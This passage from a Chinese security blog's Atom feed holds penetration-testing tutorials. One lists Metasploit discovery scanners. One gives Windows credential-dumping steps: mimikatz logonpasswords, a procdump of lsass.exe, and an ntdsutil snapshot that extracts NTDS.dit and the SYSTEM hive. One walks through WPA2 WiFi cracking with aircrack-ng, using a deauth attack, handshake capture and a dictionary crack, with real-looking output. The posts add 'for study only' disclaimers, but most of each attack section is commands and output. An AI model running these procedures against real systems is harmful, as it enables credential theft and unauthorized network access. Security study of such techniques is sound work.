&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/arp_sweep&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/empty_udp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/ipv6_multicast_ping&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/ipv6_neighbor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/udp_probe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/udp_sweep&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="metasploit" scheme="https://www.marksec.org/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之hash抓取</title>
    <link href="https://www.marksec.org/2017/12/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8A%93hash/"/>
    <id>https://www.marksec.org/2017/12/19/内网渗透之抓hash/</id>
    <published>2017-12-19T12:55:00.000Z</published>
    <updated>2019-03-24T05:30:32.692Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>  在平时的渗透工作中，对于服务器或者机器的密码的抓取是必须的，不管是明文密码还是hash都对我们后续的安全渗透工作大有裨益，今天我总结几款比较常见的密码抓取工具，供大家一起学习讨论。<br></blockquote><h2 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h2><p>wce是一款基础款工具，其命令也只要<code>wce.exe -w</code>即可，作为基础款工具，局限特别大，面对杀软等根本无法免杀，所以一般使用较少。</p><h2 id="MIMIKATZ"><a href="#MIMIKATZ" class="headerlink" title="MIMIKATZ"></a>MIMIKATZ</h2><p>mimikatz作为老牌的黑客工具已经升级到2.0的版本了，其中破解密码的功能也是非常方便，但对于杀软的防御也较弱，如果完全控制机器，关闭杀软也可，在msf中也要mimikatz的模块<br>也可以在渗透中较为方便的获得密码</p><pre>mimikatz# privilege::debug  //提升权限mimikatz# sekurlsa::logonpasswords  //抓取密码</pre><a id="more"></a>## PROCDUMPProcdump是一个轻量级的Sysinternal团队开发的命令行工具, 它的主要目的是监控应用程序的CPU异常动向, 并在此异常时生成crash dump文件, 供研发人员和管理员确定问题发生的原因，你还可以把它作为生成dump的工具使用在其他的脚本中。因为可以抓取内存生成dump，所以我们可以抓取内存进行分析解密用户名和密码，该工具作为工程师分析CPU的工具，所以杀软等都没有报毒，安全可靠。<pre>管理员身份启动cmdprocdump64.exe -accepteula -ma lsass.exe 文件名（1.dmp） 存放路径</pre>将生成的文件传出后使用mimikatz破解<pre>mimikatz # sekurlsa::minidump 文件名（1.dmp）mimikatz # sekurlsa::logonPasswords full</pre><h2 id="域快照"><a href="#域快照" class="headerlink" title="域快照"></a>域快照</h2><pre>使用域管账号登陆，以管理员身份启动cmd 执行： snapshot activate instance ntds create mount {GUID} #{GUID是一串数字} 进入c盘根目录，进入域快照内 将\WINDOWS\NTDS\目录下的NTDS.dit拷贝出 卸载快照 unmount {GUID} quit quit备份system.hive reg save hklm\system c:\system.hive</pre> 将上述两个文件拷出，使用QuarksPwDump离线版进行破解(插一句：QuarksPwDump有直接抓取版，但对过杀软程度未可知) <pre> ntdsutil snapshot "activate instance ntds" create quit quit >> 1.txt reg save hklm\system c:\windows\temp\xxsyskeyaa.hive ntdsutil snapshot "mount {1.txt中的GUID}" quit quit</pre> <blockquote><br>   对于hash的抓取方法还有powershell等许多方法，在此就不多于赘述了，等学习powershell的时候再详细的写文章，注意本文仅作为交流学习用，请勿用作他处。 <br><br>   *本文为原创，转载请注明出处<br> </blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;  在平时的渗透工作中，对于服务器或者机器的密码的抓取是必须的，不管是明文密码还是hash都对我们后续的安全渗透工作大有裨益，今天我总结几款比较常见的密码抓取工具，供大家一起学习讨论。&lt;br&gt;&lt;/blockquote&gt;

&lt;h2 id=&quot;WCE&quot;&gt;&lt;a href=&quot;#WCE&quot; class=&quot;headerlink&quot; title=&quot;WCE&quot;&gt;&lt;/a&gt;WCE&lt;/h2&gt;&lt;p&gt;wce是一款基础款工具，其命令也只要&lt;code&gt;wce.exe -w&lt;/code&gt;即可，作为基础款工具，局限特别大，面对杀软等根本无法免杀，所以一般使用较少。&lt;/p&gt;
&lt;h2 id=&quot;MIMIKATZ&quot;&gt;&lt;a href=&quot;#MIMIKATZ&quot; class=&quot;headerlink&quot; title=&quot;MIMIKATZ&quot;&gt;&lt;/a&gt;MIMIKATZ&lt;/h2&gt;&lt;p&gt;mimikatz作为老牌的黑客工具已经升级到2.0的版本了，其中破解密码的功能也是非常方便，但对于杀软的防御也较弱，如果完全控制机器，关闭杀软也可，在msf中也要mimikatz的模块&lt;br&gt;也可以在渗透中较为方便的获得密码&lt;/p&gt;
&lt;pre&gt;
mimikatz# privilege::debug  //提升权限
mimikatz# sekurlsa::logonpasswords  //抓取密码&lt;/pre&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web安全" scheme="https://www.marksec.org/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>无线wifi破解</title>
    <link href="https://www.marksec.org/2017/02/16/%E6%97%A0%E7%BA%BFWiFi%E7%A0%B4%E8%A7%A3/"/>
    <id>https://www.marksec.org/2017/02/16/无线WiFi破解/</id>
    <published>2017-02-16T00:55:00.000Z</published>
    <updated>2019-03-20T15:36:36.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>  WiFi在我们生活中扮演不可或缺的角色，对于WiFi安全也是人们关注的热点之一，现在教大家利用软件进行WiFi破解渗透，注意WiFi破解技术只用于技术交流，生活中破解他人WiFi属于侵权行为。<br></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>我们需要一台电脑，一块无线网卡，一个kail系统，如果你是Windows系统，你可以将kail系统安装在虚拟机里，然后kail虚拟机导入你的无线网卡就可以完成前期准备，小米WiFi和360WiFi都可以变为无线网卡使用，如果你的Linux系统就可以直接使用了，我使用的是archLinux的发行版manjaro，我们使用的软件是aircrack-ng 这一款WiFi破解软件，它主要破解的是wpa/wpa2的WiFi，对于wpe的WiFi现在已经绝迹，这里就不说了。<br><a id="more"></a></p><h2 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h2><h3 id="查看自己的无线网"><a href="#查看自己的无线网" class="headerlink" title="查看自己的无线网"></a>查看自己的无线网</h3><p><code>airmon-ng</code></p><pre>[makai@manjaro ~]$ sudo airmon-ng  //sudo为提为root权限，root用户无需sudoPHY     Interface       Driver          Chipsetphy0    wlp3s0          rtl8192ce       Realtek Semiconductor Co., Ltd. RTL8188CE 802.11b/g/n WiFi Adapter (rev 01)</pre><p>上面的命令是列出支持监控模式的无线网卡，wlp3s0即为我们的网卡，如果没有任何输出，表示无线网卡不支持监控模式。你可以看到我的wlan0支持监控模式</p><h3 id="开启无线网卡的监控模式"><a href="#开启无线网卡的监控模式" class="headerlink" title="开启无线网卡的监控模式"></a>开启无线网卡的监控模式</h3><p><code>airmon-ng start wlp3s0</code></p><pre>[makai@manjaro ~]$ sudo airmon-ng start wlp3s0Found 4 processes that could cause trouble.If airodump-ng, aireplay-ng or airtun-ng stops working aftera short period of time, you may want to run 'airmon-ng check kill'  PID Name  470 avahi-daemon  472 NetworkManager  484 avahi-daemon  523 wpa_supplicantPHY     Interface       Driver          Chipsetphy0    wlp3s0          rtl8192ce       Realtek Semiconductor Co., Ltd. RTL8188CE 802.11b/g/n WiFi Adapter (rev 01)                (mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)//开启监控后，系统自动将wlp3s0转为了wlp3s0mon                (mac80211 station mode vif disabled for [phy0]wlp3s0)</pre><h3 id="查看当前WiFi网络"><a href="#查看当前WiFi网络" class="headerlink" title="查看当前WiFi网络"></a>查看当前WiFi网络</h3><p>  <code>airodump-ng wlp3s0mon</code></p><pre>[CH  9 ][ Elapsed: 24 s ][ 2016-11-02 16:22 ]BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID00:87:46:20:08:1F  -46       57       49    2   6  54e. WPA2 CCMP   PSK  36000:36:76:11:61:A7  -53       50      999   49   1  54e. WPA2 CCMP   PSK  mima1-8F0:B4:29:3B:E0:65  -47       47      628    0   1  54e. WPA2 CCMP   PSK  redian8C:F2:28:26:CE:AA  -44       38       26    0  13  54e  WPA2 CCMP   PSK  MERCURY_CEAA  //这是我们的实验路由器B0:D5:9D:6D:2E:F8  -53       58      338   65  11  54e. WPA2 CCMP   PSK  360免费WiFi-F8B0:D5:9D:80:C0:B0  -47       47        1    0   6  54e. WPA2 CCMP   PSK  360免费WiFi-B0D4:83:04:F9:27:3A  -56       50       12    0  11  54e. WPA2 CCMP   PSK  FAST30:FC:68:23:44:C4  -64       28        9    0   1  54e. WPA2 CCMP   PSK  CMCC-02BSSID              STATION            PWR   Rate    Lost    Frames  Probe(not associated)   B6:F6:EA:9D:63:F4  -21    0 - 1      4        4(not associated)   20:82:C0:10:FA:D9  -77    0 - 1      0        3  XiaoFangJia(not associated)   AC:36:13:79:54:2C  -81    0 - 1      0        100:87:46:20:08:1F  CC:3A:61:C9:15:77  -37    0 - 1      0        500:87:46:20:08:1F  A4:44:D1:32:25:27  -33    0 - 1     21       4900:87:46:20:08:1F  C0:EE:FB:06:2B:9A  -47    0 - 1e     0       4800:36:76:11:61:A7  9C:2A:70:C9:C3:53  -35    1e- 1e  1173      90700:36:76:11:61:A7  74:E5:0B:A3:C6:B2  -46    1e- 1e   296       9000:36:76:11:61:A7  90:C1:15:F1:86:C9  -55    0 - 1     12        400:36:76:11:61:A7  C4:43:8F:F2:88:96  -71    1e- 1      0       13F0:B4:29:3B:E0:65  60:F1:89:60:6D:CA  -34    1e- 1e     0      6278C:F2:28:26:CE:AA  68:3E:34:3C:47:C0  -47    1e- 1      0       54B0:D5:9D:6D:2E:F8  38:BC:1A:EC:34:62  -55    1e- 1e    44      340D4:83:04:F9:27:3A  38:BC:1A:23:B1:51  -67    0 - 1    100        7D4:83:04:F9:27:3A  D0:7A:B5:57:60:21  -69    0 - 1      0        1</pre><p>上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等，要记住要破解wifi的频道号（CH）和BSSID<br>ctrl+c结束进程，ctrl+s暂停，ctrl+q继续，可以利用这三个快捷键进行操作，当前我们可以ctrl+c停止</p><h3 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h3><p><code>airodump-ng -c 13 -w test  wlp3s0mon</code><br>-c为CH即为信道,-w 为保存的位置,-w test为将数据包保存在test文件</p><pre>CH 13 ][ Elapsed: 24 s ][ 2016-11-02 16:44 ][ fixed channel wlp3s0mon: 4BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSIDF0:B4:29:3B:E0:65  -46   1       30      522    0   1  54e. WPA2 CCMP   PSK  redianB0:D5:9D:80:C0:B0  -47   0       18        0    0   6  54e. WPA2 CCMP   PSK  360免费WiFi-B08C:F2:28:26:CE:AA  -49  43       95       22    0  13  54e  WPA2 CCMP   PSK  MERCURY_CEAA   //我们的路由器mac00:36:76:11:61:A7  -47   0       25      117    1   1  54e. WPA2 CCMP   PSK  mima1-800:87:46:20:08:1F  -53   5       26       26    0   6  54e. WPA2 CCMP   PSK  360D4:83:04:F9:27:3A  -57   0      115       32    0  11  54e. WPA2 CCMP   PSK  FAST30:FC:68:23:44:C4  -58   0       28        6    1   1  54e. WPA2 CCMP   PSK  CMCC-02B0:D5:9D:6D:2E:F8  -63   9      112      112   12  11  54e. WPA2 CCMP   PSK  360免费WiFi-F8BSSID              STATION（手机mac地址） PWR   Rate    Lost    Frames  Probe(not associated)   00:19:86:31:94:24  -47    0 - 1      0        2(not associated)   A4:17:31:4F:0C:5F  -47    0 - 1     15        6(not associated)   8A:84:7C:92:A9:53  -51    0 - 1      2        3(not associated)   68:3E:34:3C:91:58  -55    0 - 1     13        7(not associated)   AC:B5:7D:20:46:D1  -59    0 - 1      0       18  CMCC-01F0:B4:29:3B:E0:65  60:F1:89:60:6D:CA  -37    1e- 1e     0      5228C:F2:28:26:CE:AA  68:3E:34:3C:47:C0  -17    1e- 1      0       27    //路由器链接的手机mac00:36:76:11:61:A7  9C:2A:70:C9:C3:53  -34    1e- 1e     3      11400:36:76:11:61:A7  24:0A:64:9C:E9:91  -47    0 - 1e     0        400:36:76:11:61:A7  90:C1:15:F1:86:C9  -54    0 - 1e     0        300:36:76:11:61:A7  C4:43:8F:F2:88:96  -77    0 - 1      0        100:87:46:20:08:1F  A4:44:D1:32:25:27  -47    0 - 1e     0       56D4:83:04:F9:27:3A  38:BC:1A:23:B1:51  -69    0 - 1    961       52D4:83:04:F9:27:3A  08:57:00:C4:42:3A  -65    0 - 1e     0        5  FAST30:FC:68:23:44:C4  20:2D:07:CE:8C:CE  -79    0 - 1e   228       1230:FC:68:23:44:C4  70:EC:E4:BF:C2:9F  -64    0 - 1      0        1</pre><h3 id="强制使连接到wifi的设备重新连接路由器"><a href="#强制使连接到wifi的设备重新连接路由器" class="headerlink" title="强制使连接到wifi的设备重新连接路由器"></a>强制使连接到wifi的设备重新连接路由器</h3><p><code>aireplay-ng -0 1 -a  8C:F2:28:26:CE:AA -c 68:3E:34:3C:47:C0 wlp3s0mon</code><br><br>-0指定发送反认证包的个数 -a指定无线路由器BSSID -c指定强制断开的设置</p><pre>[makai@manjaro ~]$ sudo aireplay-ng -0 1 -a  8C:F2:28:26:CE:AA -c 68:3E:34:3C:47:C0 wlp3s0mon16:52:46  Waiting for beacon frame (BSSID: 8C:F2:28:26:CE:AA) on channel 1316:52:47  Sending 64 directed DeAuth. STMAC: [68:3E:34:3C:47:C0] [ 8|57 ACKs]CH 13 ][ Elapsed: 55 mins ][ 2016-11-02 18:26 ][ WPA handshake: 8C:F2:28:26:CE:AA //我们可以看到这里变成了handshake，就是抓完包了BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</pre><p>掉线是为了让上网设备断网重新连接WiFi，这样我们就可以抓取它连接路由器时候的握手包了</p><h3 id="破解WiFi"><a href="#破解WiFi" class="headerlink" title="破解WiFi"></a>破解WiFi</h3><p><code>aircrack-ng -w 1.txt test-01.cap</code><br>1.txt为你的密码字典test-01.cap就是之前截取的包</p><pre>[makai@manjaro ~]$ sudo aircrack-ng -w 1.txt test-01.capOpening test-01.capRead 714 packets.   #  BSSID              ESSID                     Encryption   1  8C:F2:28:26:CE:AA  MERCURY_CEAA              WPA (1 handshake)   2  B0:D5:9D:6D:2E:F8  360免费WiFi-F8          WPA (0 handshake)   3  D4:83:04:F9:27:3A  FAST                      WPA (0 handshake)Index number of target network ? 1  //选择1就是破解我们的目标路由器Aircrack-ng 1.2 rc4[00:00:15] 16084/19326 keys tested (1106.08 k/s)Time left: 2 seconds                                      83.22%  KEY FOUND! [ 19940515 ]  //我们目标路由器的密码Master Key     : 69 F5 C8 9C 45 26 03 23 08 FE 27 03 D8 83 6C 0A4B 26 E1 AE 07 99 B6 11 51 1A 0F 25 AD 22 E9 5ATransient Key  : DC A9 11 93 44 A9 6A 8E 9D 79 4C 80 4F 61 3D 8CB8 C0 5C 00 B0 D0 E8 99 E7 C6 C6 FB 6D D4 D3 3594 0A A3 3B 17 00 08 F7 BA F0 4D 5E 9E B7 2C 3F22 89 70 A6 36 1E 63 D2 64 8E 52 79 FD 41 57 70EAPOL HMAC     : FD 4E CB 71 B6 9C BB E6 A2 62 6F 92 A5 54 F8 85</pre><h3 id="关闭网卡监听模式"><a href="#关闭网卡监听模式" class="headerlink" title="关闭网卡监听模式"></a>关闭网卡监听模式</h3><p><code>airmon-ng stop wlp3s0</code></p><blockquote><br>  这就是WiFi破解的全过程，当然我们还有其他的破解方法，比如ping破解法，但是总的来说使用aircrack-ng来破解WiFi是主流，同时破解字典也是十分重要的，最后再次说明，WiFi破解只能拿来技术交流，不要轻易破解他人WiFi <br><br>  *本文为原创，转载请注明出处<br></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;  WiFi在我们生活中扮演不可或缺的角色，对于WiFi安全也是人们关注的热点之一，现在教大家利用软件进行WiFi破解渗透，注意WiFi破解技术只用于技术交流，生活中破解他人WiFi属于侵权行为。&lt;br&gt;&lt;/blockquote&gt;

&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;p&gt;我们需要一台电脑，一块无线网卡，一个kail系统，如果你是Windows系统，你可以将kail系统安装在虚拟机里，然后kail虚拟机导入你的无线网卡就可以完成前期准备，小米WiFi和360WiFi都可以变为无线网卡使用，如果你的Linux系统就可以直接使用了，我使用的是archLinux的发行版manjaro，我们使用的软件是aircrack-ng 这一款WiFi破解软件，它主要破解的是wpa/wpa2的WiFi，对于wpe的WiFi现在已经绝迹，这里就不说了。&lt;br&gt;
    
    </summary>
    
    
      <category term="无线安全" scheme="https://www.marksec.org/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
